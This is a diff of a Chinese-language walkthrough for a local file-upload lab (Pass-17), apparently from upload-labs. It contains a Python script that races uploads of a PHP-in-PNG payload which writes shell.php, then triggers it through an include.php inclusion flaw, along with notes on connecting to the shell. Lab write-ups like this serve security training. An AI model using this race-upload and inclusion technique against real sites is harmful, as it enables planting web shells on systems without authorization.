@@ -86,19 +86,15 @@ pass13-pass16补充
 
 代码如下
 
-```python
+```python  
 # coding:utf-8
 import requests
 from concurrent.futures import ThreadPoolExecutor
  
- 
 def td(list):
     url = 'http://localhost/Pass-17/index.php?action=show_code'
-    files = {'upload_file': (
-       	#  php文件也可以尝试
-        # 'szm.php', "<?php fputs(fopen('shell.php','w'),'<?php phpinfo();  ?>' ); ?>")}
-        # 也可以使用图片马，利用包含漏洞，此时的shell.php文件会出现在include.php同级目录
-        'szm.png', "<?php fputs(fopen('shell.php','w'),'<?php phpinfo();  ?>' ); ?>")}
+    files = {'upload_file': ('szm.png', "<?php fputs(fopen('shell.php','w'),'<?php phpinfo();  ?>' ); ?>")}
+       
     data = {'submit': '上传'}
     r = requests.post(url=url, data=data, files=files)
     re = requests.get('http://localhost/include.php?file=upload/szm.png')
@@ -109,7 +105,6 @@ if __name__ == '__main__':
     with ThreadPoolExecutor(20) as p:
         p.map(td, range(200))
 ```
-
 上传php文件，访问这个php文件，访问成功即可连接
 
 上传图片马，配合include.php时，注意上传路径
